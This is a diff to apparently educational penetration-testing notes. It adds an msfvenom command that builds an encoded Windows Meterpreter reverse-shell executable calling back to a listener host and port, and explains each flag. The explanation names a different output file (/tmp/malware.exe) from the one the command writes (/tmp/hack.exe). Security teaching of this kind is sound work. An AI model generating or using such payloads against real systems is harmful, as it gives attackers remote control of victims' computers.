@@ -791,7 +791,23 @@ Things to take into account when desiging a payload
 3. Encoder to use `-e x86/shikata_ga_nai` is common to use
 4. Defining the file type, typically exe `-f exe`
 5. Path where the file will be placed after creation could be in the `temp` folder, or `www` folder - is specified using the `-o` flag
+6. The listening host and the port, which is usually defined for the hacker's machine
 
+  - `msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe -o /tmp/hack.exe LHOST=192.168.0.8 LPORT=4444`
+
+      - `msfvenom`: Launches the `msfvenom` program.
+
+      - `-p`: Indicates payload. 
+
+      - `windows/meterpreter/reverse_tcp`: The Metasploit command module.
+
+      - `-a x86`: Designates the architecture we will use. `x86` is default.
+
+      - `-e x86/shikata_ga_nai`: Designates the encoder we will use.
+
+      - `-f exe`: Indicates the file type to create. In this case, `.exe`.
+
+      - `-o /tmp/malware.exe`: Creates an output file, naming the file (`malware.exe`) and location (inside the `/tmp` directory).
 
 **Meterpreter**
 
